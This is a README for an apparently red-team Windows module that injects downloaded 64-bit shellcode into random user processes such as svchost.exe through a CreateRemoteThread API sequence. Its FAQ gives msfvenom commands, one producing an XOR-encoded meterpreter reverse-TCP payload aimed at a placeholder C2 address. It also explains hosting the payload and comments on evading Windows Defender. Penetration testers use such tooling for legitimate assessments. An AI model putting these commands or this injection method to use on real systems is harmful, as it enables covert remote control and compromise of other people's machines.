# Simple Processs Injection

Performs a simple remote process injection of 64-bit shellcode. Windows calc.exe will run by default or URL parameter can point to base64 encoded custom shellcode file. 

## Credits and References

Author: Joff Thyer

Operating System(s): Windows

## Installation

Please reference our module [installation guide](https://github.com/scythe-io/community-modules/wiki) on the wiki.

##  Manual

```
usage: process_inject_method1 [-h] [-u URL]
Inject shellcode into memory
optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  URL to GET base64 encoded shellcode from
rivergumsecurity.process_inject_method1 --url <shellcode URL>
```

## FAQ:

### Question 1: What is this module?
The simple process injection module is designed to inject 64-bit shellcode into memory using Windows kernel32.dll calls. The module has an optional parameter of --url which allows you to specify a URL from which to load the shellcode. If you do not provide this parameter, the default shellcode of loading a Windows calculator will be used.

### Question 2: What methods and remote process does it choose to inject?
The module uses a combination of Windows kernel32.dll calls in sequence as follows; OpenProcess(), VirtualAllocEx(), WriteProcessMemory(), VirtualProtectEx(), and CreateRemoteThread(). The process selection is a random choice of user owned processes named "svchost.exe", "runtimebroker.exe", or "dllhost.exe". This selected process has to be 64-bit architecture to match the shellcode thread that will be created.

### Question 3: How do I create and host new shellcode for use by this module?
You must generate 64-bit assembly code using a tool of your choice. Many people in the penetration testing industry are likely to choose using something like Metasploit or Cobalt Strike to generate the assembly code (otherwise known as shellcode). The resulting file you generate must be base64 encoded. If you are going to use a C2 channel, I highly recommend you proceed with a stageless payload and a simple shellcode encoding. (Please substitute your actual C2 server IP address for the "LHOST=" portion below.) An example of this would be as follows:

```$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=1.2.3.4 LPORT=443 -e x64/xor -f raw | base64 -w0 >shellcode.txt```

```$ msfvenom -p windows/x64/exec CMD=notepad.exe | base64 -w0 >shellcode.txt```

The resulting "shellcode.txt" file must be hosted on a web server of your choosing.

### Question 4: Will my endpoint security defense be triggered?
This is dependent on the endpoint security product you are using. Second stage payloads from commodity frameworks like Metasploit WILL TRIGGER Windows Defender for example. If the module fails to correctly inject shellcode into the randomly selected process, it will return an error based on the return call from the specific kernel32 API call being made at the time. If the module succeeds, it will return the process identifer selected and injected into.

### Question 5: Do I host the shellcode on HTTP or HTTPS server?
You can do either HTTP or HTTPS. If you decide to use HTTPS (TLS), please ensure that you use a valid signed certificate! The shellcode injection process will fail if the TLS certificate cannot be properly validated.

### Question 6: Does it work with the 32-bit Python interpreter?
No it does not. You must use 64-bit shellcode with this module and it must run with the 64-bit Python runtime.
